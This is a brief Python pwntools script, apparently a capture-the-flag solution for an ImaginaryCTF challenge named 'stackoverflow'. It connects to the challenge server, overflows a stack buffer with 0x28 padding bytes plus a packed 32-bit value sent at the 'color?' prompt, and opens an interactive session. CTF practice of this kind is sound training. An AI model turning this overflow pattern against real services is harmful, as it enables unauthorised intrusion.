from pwn import *
h,p = "chal.imaginaryctf.org",42001
p = remote(h,p)
#p = process("./stackoverflow")
exp = "A"*0x28
win = 1768125542
exp += p32(win)
p.sendlineafter("color?\n",exp)
p.interactive()
